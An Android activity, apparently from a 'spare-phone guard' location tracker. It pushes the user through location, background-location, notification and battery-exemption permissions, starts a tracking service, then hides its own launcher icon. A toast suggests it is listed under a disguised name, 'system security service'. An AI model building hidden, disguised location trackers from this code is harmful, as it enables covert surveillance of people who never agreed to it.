package com.example.devicefinder;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int REQ_FG_LOC = 100;
    private static final int REQ_BG_LOC = 101;
    private static final int REQ_NOTIFICATION = 102;

    private boolean serviceStarted = false;

    // 核心状态标志：标记用户当前是否从某个设置页返回
    private boolean waitingForBgLocSetting = false;
    private boolean waitingForBatterySetting = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (getIntent() != null && getIntent().getCategories() != null
                && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
            Toast.makeText(this, "🛡️ 备用机守护系统初始化中", Toast.LENGTH_SHORT).show();
        }

        if (!hasForegroundLocationPermission()) {
            requestForegroundLocation();
        } else {
            proceedAfterForegroundLocation();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        // 1. 用户从“应用详情页”返回（去设置后台定位）
        if (waitingForBgLocSetting) {
            waitingForBgLocSetting = false;
            // 不论用户是否真的设置了，都继续往下走，避免死循环
            proceedAfterBackgroundLocation();
        }

        // 2. 用户从“电池优化设置”返回
        if (waitingForBatterySetting) {
            waitingForBatterySetting = false;
            // 电池优化流程结束，此时才真正启动服务并关闭界面
            startTrackingServiceAndFinish();
        }
    }

    // ==================== 第一步：前台定位 ====================

    private boolean hasForegroundLocationPermission() {
        if (Build.VERSION.SDK_INT < 23) return true;
        return checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                || checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestForegroundLocation() {
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
            }, REQ_FG_LOC);
        } else {
            proceedAfterForegroundLocation();
        }
    }

    // ==================== 第二步：后台定位 ====================

    private void proceedAfterForegroundLocation() {
        if (Build.VERSION.SDK_INT >= 29 && !hasBackgroundLocationPermission()) {
            if (Build.VERSION.SDK_INT >= 30) {
                // Android 11+ 必须用弹窗拦一下，用户点确认才跳转
                new AlertDialog.Builder(this)
                        .setTitle("设置后台定位")
                        .setMessage("请在下个页面选择「权限」→「位置信息」→「始终允许」。\n\n如果不设置，锁屏后将无法更新位置。")
                        .setCancelable(false)
                        .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                waitingForBgLocSetting = true;
                                try {
                                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                    intent.setData(Uri.parse("package:" + getPackageName()));
                                    startActivity(intent);
                                } catch (Exception e) {
                                    // 如果跳转失败，直接跳过
                                    waitingForBgLocSetting = false;
                                    proceedAfterBackgroundLocation();
                                }
                            }
                        })
                        .setNegativeButton("暂不设置", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                // 用户跳过，继续下一步
                                proceedAfterBackgroundLocation();
                            }
                        })
                        .show();
            } else {
                // Android 10 走系统弹窗
                requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQ_BG_LOC);
            }
        } else {
            proceedAfterBackgroundLocation();
        }
    }

    private boolean hasBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT < 29) return true;
        return checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    // ==================== 第三步：通知权限 ====================

    private void proceedAfterBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATION);
        } else {
            proceedAfterNotification();
        }
    }

    // ==================== 第四步：电池优化 ====================

    private void proceedAfterNotification() {
        if (isBatteryOptimizationIgnored()) {
            // 已经白名单了，直接启动服务并结束
            startTrackingServiceAndFinish();
        } else {
            // 弹出电池优化引导
            new AlertDialog.Builder(this)
                    .setTitle("必须关闭电池优化")
                    .setMessage("为保证手机息屏后仍能持续上报位置，\n请将本应用设为「不限制」/「无限制」。\n\n" +
                            "如果不设置，系统会在息屏后暂停本应用的网络和定位。")
                    .setCancelable(false)
                    .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            waitingForBatterySetting = true;
                            openBatteryOptimizationSettings();
                        }
                    })
                    .setNegativeButton("暂时跳过", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            Toast.makeText(MainActivity.this, "⚠️ 已跳过，息屏后可能收不到定位", Toast.LENGTH_LONG).show();
                            startTrackingServiceAndFinish();
                        }
                    })
                    .show();
        }
    }

    private boolean isBatteryOptimizationIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    private void openBatteryOptimizationSettings() {
        try {
            Intent directIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            directIntent.setData(Uri.parse("package:" + getPackageName()));

            if (directIntent.resolveActivity(getPackageManager()) != null) {
                startActivity(directIntent);
            } else {
                Toast.makeText(this, "请在列表中找到「系统安全服务」并设为「不优化」", Toast.LENGTH_LONG).show();
                startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
            }
        } catch (Exception e) {
            waitingForBatterySetting = false;
            Toast.makeText(this, "⚠️ 无法打开电池优化设置，请手动前往系统设置", Toast.LENGTH_LONG).show();
            startTrackingServiceAndFinish();
        }
    }

    // ==================== 系统权限回调 ====================

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQ_FG_LOC) {
            boolean granted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
            if (granted) {
                proceedAfterForegroundLocation();
            } else {
                Toast.makeText(this, "⚠️ 未授予定位权限，定位功能不可用", Toast.LENGTH_LONG).show();
                proceedAfterBackgroundLocation();
            }
        } else if (requestCode == REQ_BG_LOC) {
            proceedAfterNotification();
        } else if (requestCode == REQ_NOTIFICATION) {
            proceedAfterNotification();
        }
    }

    // ==================== 最终收尾：启动服务 + 隐藏图标 + 关闭界面 ====================

    private void startTrackingServiceAndFinish() {
        if (serviceStarted) {
            // 防止重复启动后直接关闭
            finish();
            return;
        }
        serviceStarted = true;

        // 1. 启动服务
        Intent intent = new Intent(this, TrackingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }

        // 2. 隐藏桌面图标
        hideLauncherIcon();

        // 3. 关闭界面
        finish();
    }

    private void hideLauncherIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName alias = new ComponentName(this, "com.example.devicefinder.VisibleAliasActivity");
            if (pm.getComponentEnabledSetting(alias) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                pm.setComponentEnabledSetting(alias,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
            }
        } catch (Exception ignored) {}
    }
}
